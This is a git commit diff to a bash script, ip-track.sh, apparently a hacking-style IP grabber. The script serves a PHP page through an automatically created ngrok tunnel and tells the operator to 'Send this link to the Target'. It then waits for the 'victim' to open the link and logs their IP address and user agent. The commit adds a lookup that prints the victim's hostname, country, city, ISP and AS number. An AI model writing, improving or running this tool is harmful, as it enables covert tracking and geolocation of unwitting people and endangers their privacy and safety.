95b0dfdfede9211c3cb3e1d47da5f901479f0e26
Justin <47774897+Mr-silentcoder@users.noreply.github.com>
2020-04-29 15:55:05 +0530

    Update ip-track.sh

--- ip-track.sh
+++ ip-track.sh
@@ -28,12 +28,15 @@ printf "\e[1;94m[\e[0m*\e[1;94m] Thanks  : @thelinuxchoice \n"
 printf "\e[1;95m[\e[0m*\e[1;95m] Thanks  : Victor Stanciu \n"
 printf "\e[1;96m[\e[0m*\e[1;96m] Moded   : Mr.silent coder \n"
 printf "\e[1;31m[\e[0m*\e[1;31m] Warning : Stay Legal! \n\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] Open Ngrok http port 80 \n" 
-printf "\e[1;92m[\e[0m*\e[1;92m] ex: ngrok http 80 \n" 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-sudo php -S "localhost:80" > /dev/null 2>&1 & 
+sudo php -S "127.0.0.1:3333" > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Send Ngrok link to the Victim\e[0m\e[1;77m %s\e[0m\n" 
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
+ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
+sleep 10
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
+
 
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
 while [ true ]; do
@@ -65,7 +68,80 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;77m %s\e[0m\n" $uaget
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat ip.txt >> saved.ip.txt
 killall -2 php > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+
+if [[ -e iptracker.log ]]; then
+rm -rf iptracker.log
+fi
+
+IFS='\n'
+iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
+IFS=$'\n'
+continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
+printf "\n"
+hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
+if [[ $hostnameip != "" ]]; then
+printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
+fi
+##
+
+reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
+if [[ $reverse_dns != "" ]]; then
+printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
+fi
+##
+
+
+if [[ $continent != "" ]]; then
+printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
+fi
+##
+
+country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+if [[ $country != "" ]]; then
+printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
+fi
+##
+
+state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+if [[ $state != "" ]]; then
+printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
+fi
+##
+city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+if [[ $city != "" ]]; then
+printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
+fi
+##
+
+isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $isp != "" ]]; then
+printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
+fi
+##
+
+as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $as_number != "" ]]; then
+printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
+fi
+##
+
+ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+if [[ $ip_speed != "" ]]; then
+printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
+fi
+##
+ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+
+if [[ $ip_currency != "" ]]; then
+printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
+fi
+##
+printf "\n"
+rm -rf iptracker.log
 exit 1
+ctrl +c
 }
 
 stop() {
@@ -76,6 +152,7 @@ checkphp=$(ps aux | grep -o "php" | head -n1)
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
+killall ngrok > /dev/null 2>&1
 fi
 
 
